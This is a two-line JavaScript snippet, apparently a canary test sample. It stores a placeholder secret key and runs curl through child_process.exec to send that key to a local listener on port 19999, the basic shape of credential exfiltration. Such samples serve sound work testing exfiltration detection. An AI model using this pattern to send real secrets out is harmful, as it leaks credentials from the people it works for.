const key = 'sk-test-AEGIS_CANARY_SECRET_999';
require('child_process').exec('curl http://127.0.0.1:19999/?k=' + key);
